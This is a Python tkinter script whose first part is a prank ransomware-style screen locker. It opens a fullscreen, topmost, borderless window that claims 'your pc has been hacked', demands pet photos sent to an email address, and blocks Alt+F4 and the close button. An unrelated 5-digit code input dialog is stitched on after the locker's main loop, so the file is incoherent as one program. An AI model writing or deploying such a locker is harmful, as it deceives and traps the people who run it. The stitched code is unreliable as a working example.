import tkinter as tk

ASCII = r"""
                                                                                . . .  .            
             .                                               .       . .      .                     
                                             .                                                      
                                          .             .          .                   .            
   .                                             .                  .                               
        .  .  .                 .   . .                               .                             
                            . .  .......... ............. ..........     .                          
   .         .            .      ... .......-+*%@@@@@%#*=:.... .. ..   . .                     .    
  .      .           .           ....-*%@@@@@@@@@@@@@@@@@@@@@%#=:...      . .                       
                      ...........:*@@@@@%#+:.           ..=*%@@@@@%=... .......                     
.  .      ..     .    ........-%@@@@#-.......           .......:+@@@@%+... .. .                     
                      .....:+@@@%+:..........           ........ ..=#@@@#:.....                     
                 ..    . .*@@@#...                      .      .    ..+@@@%:. ......          .     
                 ... ...+@@@+......               .                .....=@@@#:.......               
.   .            .... -@@@#.......  ..                    . .      .... ..=@@@+......               
                 ....*@@@:.....  .                     .           .........#@@#:....      .    .   
               . ...#@@#.....              .                    .    .   ....=@@@:..            .   
                 ..%@@+.......                      .                    .....:@@@-..           .   
    .      .......#@@=.. . ..     ... .... .  .          . ... .....     .... .-%@@......           
       .  . .....+@@+ ..         ...=%@@%=...           ...:#@@@+...         . .-@@@:.....    . .   
 ..   .    .....-@@%..  . .   .  ..%@@@@@@%.. .         ..+@@@@@@@: .  .       . =@@*.. ..          
         . .....%@@:...          .+@@@@@@@@*..          .:@@@@@@@@@.           ...#@@:....      .   
   . .     .. .=@@*...           .#@@@@@@@@%.           .*@@@@@@@@@-           ...=@@#....          
            ...*@@:. ..          .#@@@@@@@@%.            *@@@@@@@@@-     .     ....@@@:...     .   .
           ....%@%......       . .+@@@@@@@@*.           .:@@@@@@@@%.           ....*@@=...          
            ...@@#.....          ..#@@@@@@#..            .+@@@@@@%:.  . .      ....=@@+... .        
           . .:@@#...            ...-#@@#-..            ...:*@@%+...           . ..-@@*...  .       
           ...:@@#.....          ....... .....   ..    .........  .            ....-@@*...    .     
            ...@@#...                  . .... ......... ......           .     ....=@@+...          
           ....%@%:....                . .....................   .             ....#@@-...          
 .         ....*@@- ..             .   ....=#@@@@@@@@@@@%+:...           .     ....@@@:...          
           ....=@@*...           ......+%@@@@@%#**++*#%@@@@@@*-.....        .  . .=@@*....          
           . ...%@@-...     .    ...-@@@@@+.....   .......=%@@@@*...           ...%@@:....          
 . .       .....:@@%:.           .+@@@%-.....................:*@@@#.      .    ..*@@+.....   .      
     .           =@@*..... ... .-@@@#:.. .                .   ..+@@@+...........+@@%.       . .     
     .   .  .    .#@@*.....  ..+@@%:...                       ....#@@%:........=@@%..               
                 ..*@@*........#@*.....      . .              .....=@%-.......=@@%:..               
                 ...*@@@..........              .   .              ..........*@@#....               
           .  .  ....-@@@=........   .                             ........-%@@*....                
                 .....:#@@@-...           .       ..                   ...*@@%-...... .             
                      ..-@@@@:....... ..         .            .... .... *@@@+..            .        
      .  .           .....=%@@%=........         .         .  . .....-#@@@*....                     
         .            ......-%@@@@-.....                      ....-*@@@@+.......              .   . 
.               ..          ...=@@@@@#-.......................:*%@@@@*:...                      .   
  .   .                     ......=#@@@@@@#=--:.......::-=*%@@@@@%+:......                  .       
                             .........:*@@@@@@@@@@@@@@@@@@@@@*-...........                .         
                         ..           .... .:--===+===--:.....           .   .  . .  .              
                  .   .                .  ...   ....... ......                            .         
                               .     .   .................... .            .                    .   
                              .                                                   .         .       
               .        .                            .                                ..            
                                                     .        .                   .                 
                               .                                  .  .             .                
"""

root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.configure(bg="black")

# ASCII art
ascii_label = tk.Label(
    root,
    text=ASCII,
    font=("Consolas", 6),
    fg="white",
    bg="black",
    justify="center"
)
ascii_label.place(relx=0.5, rely=0.45, anchor="center")

# Text underneath
text_label = tk.Label(
    root,
    text="your pc has been hacked! to unlock your pc send pet photos to lowtiergod555@gmail.com",
    font=("Arial", 24, "bold"),
    fg="white",
    bg="black"
)
text_label.place(relx=0.5, rely=0.75, anchor="center")

#start of blocker stuff frfr
def on_close_attempt():
    # Does nothing, effectively blocking the close
    pass

def on_alt_f4(event):
    on_close_attempt()
    return "break"  #: Stops Alt+F4 from closing the window

# Attach the blockers to the root window
root.bind('<Alt-F4>', on_alt_f4)
root.protocol("WM_DELETE_WINDOW", on_close_attempt)
#

root.mainloop()   
def validate_digit(char):
    # Allow only digits
    return char.isdigit() or char == ""

def main():
    root = tk.Tk()
    root.title("5-Digit Code Input")
    root.geometry("300x150")

    # Register the validation function
    reg = root.register(validate_digit)

    tk.Label(root, text="Enter 5-digit code:", font=("Arial", 12)).pack(pady=10)

    # Entry widget with validation:
    # validate="key" checks on every keystroke
    # validatecommand=(reg, '%S') passes only the character being typed
    entry = tk.Entry(root, validate="key", validatecommand=(reg, '%S'), width=20)
    entry.pack(pady=5)

    # Optional: Enforce max length of 5 using trace
    def limit_length(*args):
        value = entry.get()
        if len(value) > 5:
            entry.delete(5, tk.END)

    entry_var = tk.StringVar()
    entry_var.trace_add("write", limit_length)
    entry.config(textvariable=entry_var)

    def submit():
        code = entry.get()
        if len(code) == 5:
            result_label.config(text=f"Code submitted: {code}", fg="green")
        else:
            result_label.config(text="Please enter exactly 5 digits.", fg="red")

    tk.Button(root, text="Submit", command=submit).pack(pady=10)
    result_label = tk.Label(root, text="", font=("Arial", 10))
    result_label.pack()

    root.mainloop()

if __name__ == "__main__":
    main()
